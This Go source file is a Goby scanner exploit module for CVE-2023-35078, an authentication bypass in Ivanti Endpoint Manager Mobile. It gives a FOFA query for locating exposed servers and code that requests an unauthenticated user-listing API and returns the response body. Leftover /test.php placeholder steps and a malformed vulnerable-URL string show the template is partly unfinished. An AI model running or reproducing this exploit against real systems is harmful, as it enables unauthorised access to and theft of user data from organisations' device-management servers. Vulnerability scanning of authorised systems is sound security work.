package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ivanti Endpoint Manager Mobile /mifs/aad/api/v2/authorized/users Unauthorized Access Vulnerability(CVE-2023-35078)",
    "Description": "<p>Ivanti Endpoint Manager Mobile (Ivanti EPMM) is a mobile management software engine that enables IT to set policies for mobile devices, applications, and content. This product enables mobile device management, mobile application management, and mobile content management capabilities.</p><p>An authentication bypass vulnerability in Ivanti EPMM allows unauthorized users to access restricted functionality or resources of the application without proper authentication.</p>",
    "Product": "Ivanti Endpoint Manager Mobile",
    "Homepage": "https://forums.ivanti.com/",
    "DisclosureDate": "2023-06-13",
    "PostTime": "2024-07-03",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/mifs/css/ui.login.css\" && (body=\"Ivanti\" && body=\"MobileIron\")",
    "GobyQuery": "body=\"/mifs/css/ui.login.css\" && (body=\"Ivanti\" && body=\"MobileIron\")",
    "Level": "1",
    "Impact": "<p>An attacker can construct a malicious request to bypass identity authentication and call related APIs without logging in, causing sensitive information leakage and code execution.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US</a></p>",
    "References": [
        "https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US",
        "https://avd.aliyun.com/detail?id=AVD-2023-35078"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "Unauthorized Access"
    ],
    "VulType": [
        "Information Disclosure",
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-35078"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Ivanti Endpoint Manager Mobile /mifs/aad/api/v2/authorized/users 未授权访问漏洞（CVE-2023-35078）",
            "Product": "Ivanti Endpoint Manager Mobile",
            "Description": "<p>MobileIron Sentry和MobileIron Core都是美国思可信（MobileIron）公司的产品。MobileIron Core是一款MobileIron平台的管理控制台组件。该产品支持为设备、应用程序和内容定义安全和管理策略。</p><p>CVE-2023-35078 中，攻击者可在无需登录的情况下，构造恶意请求绕过身份认证调用相关API，造成敏感信息泄漏与代码执行。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US</a><br></p>",
            "Impact": "<p>攻击者可在无需登录的情况下，构造恶意请求绕过身份认证调用相关API，造成敏感信息泄漏与代码执行。<br></p>",
            "VulType": [
                "未授权访问",
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Ivanti Endpoint Manager Mobile /mifs/aad/api/v2/authorized/users Unauthorized Access Vulnerability(CVE-2023-35078)",
            "Product": "Ivanti Endpoint Manager Mobile",
            "Description": "<p>Ivanti Endpoint Manager Mobile (Ivanti EPMM) is a mobile management software engine that enables IT to set policies for mobile devices, applications, and content. This product enables mobile device management, mobile application management, and mobile content management capabilities.<br></p><p>An authentication bypass vulnerability in Ivanti EPMM allows unauthorized users to access restricted functionality or resources of the application without proper authentication.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US\">https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US</a><br></p>",
            "Impact": "<p>An attacker can construct a malicious request to bypass identity authentication and call related APIs without logging in, causing sensitive information leakage and code execution.<br></p>",
            "VulType": [
                "Information Disclosure",
                "Unauthorized Access"
            ],
            "Tags": [
                "Information Disclosure",
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10965"
}`

	sendPayload3308 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：msg是返回的数据
		// 注意：vulInfo是请求路径
		vulInfo := `/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1`
		msg := ``
		requestConfig := httpclient.NewGetRequestConfig(vulInfo)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "application/json") {
				msg = resp.RawBody
				return true, vulInfo, msg
			}
		}
		return false, vulInfo, msg
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, _ := sendPayload3308(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, _, vulPath := sendPayload3308(expResult.HostInfo)
			expResult.Output = vulPath
			expResult.Success = true
			return expResult
		},
	))
}
